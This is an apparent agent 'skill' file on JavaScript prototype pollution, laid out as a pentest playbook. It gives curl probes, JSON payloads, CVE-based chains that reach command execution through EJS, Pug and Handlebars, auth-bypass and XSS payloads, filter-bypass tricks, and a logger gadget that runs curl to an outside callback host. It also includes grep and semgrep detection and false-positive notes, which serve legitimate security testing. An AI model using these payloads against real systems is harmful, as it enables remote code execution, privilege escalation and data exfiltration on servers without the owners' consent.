---
name: prototype-pollution
description: JavaScript/Node.js prototype pollution testing covering __proto__, constructor.prototype, Object.assign, lodash/merge, jQuery extend, and downstream gadget chains to RCE / XSS / auth bypass
---

# Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability where an attacker modifies `Object.prototype` (the base of all objects) via a recursive merge, deep-copy, or path-based assignment. Every object in the runtime inherits from `Object.prototype`, so polluting a property there causes every object in the program to expose that property. Downstream, this leaks into config reads, comparison logic, template strings, or even child-process arguments — and almost always chains to RCE, XSS, or auth bypass.

## Attack Surface

**Vulnerable merge / assign functions**

| Function | Library | Status |
|---|---|---|
| `_.merge` / `_.mergeWith` | lodash ≤ 4.17.20 | CVE-2019-10744 + others |
| `_.set` / `_.setWith` | lodash | vulnerable if attacker controls path |
| `jQuery.extend(true, ...)` | jQuery ≤ 3.4.0 | CVE-2019-11358 |
| `Object.assign(target, src1, src2)` | native | only shallow; not recursive |
| `deep-extend` | npm `deep-extend` | vulnerable |
| `merge-deep` | npm `merge-deep` | vulnerable |
| `merge` | npm `merge` | vulnerable |
| `mixin-deep` | npm `mixin-deep` | vulnerable |
| `set-value` (path-based) | npm `set-value` ≤ 0.4.0 | vulnerable if path attacker-controlled |
| `assign-deep` | npm | varies |
| `defaults-deep` | npm | vulnerable |
| `lodash._.set` | older lodash | vulnerable |
| `Hoek.merge` / `Hoek.applyToDefaults` | `@hapi/hoek` ≤ 4.2.3 | CVE-2018-3728 |
| `extend` | `node.extend` | vulnerable |
| `deepmerge` | `deepmerge` ≤ 4.2.2 | vulnerable |
| `JSON.parse` (custom reviver) | native | can be exploited via `__proto__` key |
| `qs.parse` | `qs` library | historical bugs (CVE-2017-1000048, CVE-2022-24999) |
| `express` body parser | middleware | passes `__proto__` through JSON body |

**Sinks that read from prototype**

| Sink | Chain to |
|---|---|
| `Object.keys(obj).includes(...)` for auth checks | auth bypass |
| `obj.shell_cmd_str` → `child_process.exec` | RCE |
| `obj.greeting` → template string | XSS |
| `obj.status === "admin"` check | privilege escalation |
| `Object.assign({}, defaults, userObj)` | config overwrite |
| `process.env` style reads from object | env injection |
| `__proto__`-aware property checks | RCE/XSS as above |

**Common upstream sources**
- JSON body with `__proto__` key (most common in modern Node.js apps)
- URL query string parsed by `qs` with `allowPrototypes: true` (older configs)
- Form fields named `__proto__` (rare, but seen in PHP `parse_str` in JS proxies)
- WebSocket / SSE message bodies
- File-based session stores reading from attacker-controllable paths

**Node-specific gadget chains**
- `pug` template engine (CVE-2021-21353) — `pug.render("...code...")` if `__proto__.block` is set
- `ejs` template engine (CVE-2022-29078) — `ejs.renderFile` reads `__proto__.client`/`__proto__.escapeFunction`
- `handlebars` — `__proto__.allowProtoMethodsByDefault` and `__proto__.allowProtoPropertiesByDefault` (CVE-2019-19919)
- `express` debug mode — leaks stack traces that include `__proto__` content
- `marked` — prototype values used in `href`/`title` → XSS
- `node-serialize` — function constructor + `__proto__` triggers RCE

## Detection

**Black-box probes**

```bash
# Test 1: Try polluting JSON body with __proto__
curl -X POST https://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}, "name": "test"}'
# Then probe a GET endpoint that returns isAdmin / role / user-type
curl https://target.com/api/me

# Test 2: Try polluting query string via qs parsing (older apps)
curl 'https://target.com/?__proto__[isAdmin]=1'

# Test 3: Try nested constructor.prototype
curl -X POST https://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# Test 4: URL-encoded form body
curl -X POST https://target.com/api/profile \
  -d '__proto__[isAdmin]=1'
```

**White-box detection**
```bash
# Find vulnerable merge/assign calls
grep -rn "_\.merge\|_\.set\|_\.mergeWith\|jQuery\.extend\|deep-extend\|merge-deep\|set-value\|deepmerge\|Hoek\.merge" --include="*.js" --include="*.ts" .

# Find sinks
grep -rn "child_process\|exec(\|execSync(\|spawn(\|res\.render(\|template(" --include="*.js" --include="*.ts" .

# Find JSON.parse with reviver that allows __proto__
grep -rn "JSON.parse" --include="*.js" --include="*.ts" .

# Static analysis: run semgrep with prototype-pollution rules
semgrep --config "p/javascript" --config "p/typescript" --config "p/nodejs" .
```

**Test for downstream impact** — once you confirm pollution with `__proto__.polluted=true`:
```bash
# Re-fetch the same endpoint — does `polluted` appear in the response body?
curl https://target.com/api/users
# Look for: "polluted": true, isAdmin: true, or any other marker you set
```

## Key Vulnerabilities

### Basic JSON `__proto__` Pollution (Most Common)

```json
{
  "__proto__": {
    "isAdmin": true
  },
  "username": "attacker"
}
```
Vulnerable code:
```javascript
const body = JSON.parse(req.body);
Object.assign({}, defaults, body);  // <-- vulnerable: __proto__ key passes through
```
Now `({}).isAdmin === true` in the entire process.

### Nested Object Merge

```json
{
  "settings": {
    "__proto__": {
      "shell_cmd": "id > /tmp/pwned"
    }
  }
}
```
Vulnerable code:
```javascript
const merged = _.merge({}, defaults, body);
// Internally: _.merge recurses into settings, then into __proto__, then sets on Object.prototype
```

### URL Query String (older `qs` / `express` configs)

```
POST /api/profile
Content-Type: application/x-www-form-urlencoded

__proto__[isAdmin]=1&__proto__[role]=superuser&username=attacker
```
`express.urlencoded({ extended: true })` uses `qs` — older versions (≤ 6.0.4) allowed `__proto__` parsing.

### `constructor.prototype` Path

Useful when `__proto__` is filtered:
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```
Walk: `obj.constructor === Object`, `Object.prototype.<key> = value`.

### Path-based Assignment

```json
{
  "__proto__.env.NODE_ENV": "production"
}
```
If the app uses `_.set(obj, userPath, value)` where `userPath` is attacker-controlled, this works without nested objects.

## Exploitation Chains

### Chain to RCE via Template Engine

**EJS (CVE-2022-29078)**
```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "JSON.stringify;process.mainModule.require('child_process').execSync('id')"
  }
}
```
Subsequent `res.render('view')` evaluates the polluted `escapeFunction` → RCE.

**Pug (CVE-2021-21353)**
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('id')"
    }
  }
}
```
Pug's compile path executes the polluted `block.line` → RCE.

**Handlebars (CVE-2019-19919)**
```json
{
  "__proto__": {
    "allowProtoMethodsByDefault": true,
    "allowProtoPropertiesByDefault": true
  }
}
```
Then send a Handlebars template via the next request that accesses `__proto__` properties.

### Chain to RCE via child_process Arguments

Some apps do:
```javascript
const child = exec(`convert ${userInput} /tmp/out.png`);
```
If `userInput` comes from a JSON body that was merged, polluting `__proto__.shell_args` or `__proto__.cmd` can supply the command.

**Easier path:** find a process spawn that takes an options object:
```javascript
spawn(cmd, { shell: '/bin/sh', ...userOptions });
```
Pollute `__proto__.shell` or `__proto__.cwd` to redirect execution.

### Chain to Auth Bypass

```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "canDeleteUsers": true
  }
}
```
If any check does:
```javascript
if (user.role === 'admin') { /* allow */ }
// or
if (user.isAdmin) { /* allow */ }
```
Now `({}).isAdmin === true`, `({}).role === 'admin'` → bypass.

**Common bypass patterns:**
- `obj.role === 'admin'` (string)
- `obj.isAdmin === true` (boolean)
- `obj.permissions && obj.permissions.includes('delete')` (nested)
- `Object.keys(user).includes('bypassCheck')` (presence)

### Chain to XSS

Server-side template engines (Pug, EJS, Nunjucks) often render user data into HTML:
```javascript
res.render('comment', { user: { name: userInput } });
// Template: <p>Welcome {{user.name}}</p>
```
If `userInput` is a polluted prototype property (e.g., `__proto__.name = '<img src=x onerror=fetch("/admin/...")>'`), every rendered page has the XSS.

Some apps also write `__proto__` content to localStorage / cookies / HTTP responses via JSON.stringify, which can then be served to other users.

### Chain to SSRF

If the app constructs URLs from object properties:
```javascript
fetch(`https://api.example.com/${obj.tenantId}/data`);
```
Pollute `__proto__.tenantId` → `attacker.com/../internal` → SSRF.

### Chain to Denial of Service

Pollute `__proto__.toString` with a function that throws, and any code that calls `String(obj)` will crash:
```json
{
  "__proto__": {
    "toString": "throw new Error('DoS')"
  }
}
```
JSON.stringify would catch this and use the prototype's `toString` (which throws).

## Bypass Techniques

**If `__proto__` is filtered in JSON body:**
- `constructor.prototype` path
- Send as URL-encoded form body, parsed by `qs` (different filter path)
- Use Unicode escapes: `__\u0070roto__` (sometimes not normalized)
- Nested: `{"a": {"__proto__": {"x": 1}}}` (recursive merge may not filter nested keys)
- Array key trick: `{"__proto__": [{"x": 1}]}` (some parsers handle differently)

**If pollution is detected but the impact is dead-ended:**
- Look for sinks further down the request lifecycle
- WebSocket upgrade: many apps use a different parser for WS payloads
- SSE event data
- File upload multipart fields

**If the polluted key is not used directly:**
- Indirect read via `Object.keys()`, `Object.entries()`, `JSON.stringify()`
- Implicit read via property access in template engine / config code

**Server-side-only pollution**
- Some apps don't render the polluted property back to the client
- Use blind techniques: timing differences, OOB DNS, error-based detection
- Set `__proto__.logger = function(...args){require('child_process').execSync('curl http://oast/'+args)}` to weaponize a logger call

## Testing Methodology

1. **Map inputs** — find every JSON.parse / body parser / qs.parse / form-data parser
2. **Probe `__proto__` pollution** — send `{"__proto__": {"polluted": "yes"}}` to every endpoint that takes a JSON body
3. **Probe URL form pollution** — same via `__proto__[polluted]=yes`
4. **Probe `constructor.prototype` path** — if `__proto__` is filtered
5. **Confirm pollution** — hit a different endpoint, look for `polluted` in response
6. **Find a sink** — grep the codebase for `process.env`, `child_process`, `exec`, `render`, `send`, `redirect`
7. **Weaponize** — chain the pollution to the sink
8. **PoC** — single HTTP request that:
   - Pollutes `__proto__` to set a value the sink reads
   - Triggers the sink to execute attacker code (or at least leak server state)

## Validation Requirements

- One HTTP request that pollutes and triggers the impact
- For RCE: shell command output, file write, or OOB callback
- For auth bypass: hit a privileged endpoint with no auth and confirm access
- For XSS: render the page in a real browser (or headless via puppeteer) and show the JS execution
- Show that the prototype is actually polluted — re-fetch a different endpoint and see the polluted property present
- Document the sink chain: which library function called the merge, which sink read the prototype property

## False Positives

- Server uses `Object.create(null)` for the merged object — no prototype chain
- Library is patched: `lodash ≥ 4.17.21` for `_.merge`, `jQuery ≥ 3.5.0` for `$.extend`, `qs ≥ 6.0.4`
- Custom recursive merge with `__proto__` filter: `if (key === '__proto__' || key === 'constructor') continue`
- The JSON parser strips `__proto__` from the body before the merge (Express `body-parser` doesn't, by default)
- The polluted property is read but its existence doesn't grant the attacker any privilege (dead-end sink)
- The sink is in a different process than the pollution (microservices)
- Pollution is wiped on the next request (e.g., prototype is reset, but this is rare)

## Impact

- **RCE** via template engines (ejs, pug, handlebars) and child_process sinks — full server compromise
- **Authentication bypass** — single pollution unlocks admin functions
- **Privilege escalation** — same mechanism for any role check
- **XSS** (stored or reflected via template engine)
- **SSRF** — via URL construction from polluted properties
- **Information disclosure** — leaking internal config / API keys via response pollution
- **DoS** — polluting `toString` / `valueOf` to throw

## Cross-References

- **`xss` skill** — once you have an XSS sink, escalate via cookie theft, CSRF
- **`rce` skill** — chain prototype pollution + RCE sinks
- **`path_traversal_lfi_rfi` skill** — if the RCE chain involves reading local files
- **`node-serialize`** (covered in `deserialization` skill) — can be combined with prototype pollution for RCE

## Tooling Checklist

- **semgrep** with `p/javascript`, `p/typescript`, `p/nodejs` configs (catches `_.merge`, `jQuery.extend`, etc.)
- **npm audit** / **snyk** — known vulnerable dependency detection
- **prototype-pollution** (`npx prototype-pollution`) — runtime detector
- **pp-finder** (`npx pp-finder`) — npm package for finding vulnerable npm packages in your lockfile
- **Retire.js** — old jQuery detection
- **Proxy tools** for replaying mutated JSON bodies with custom `__proto__` keys
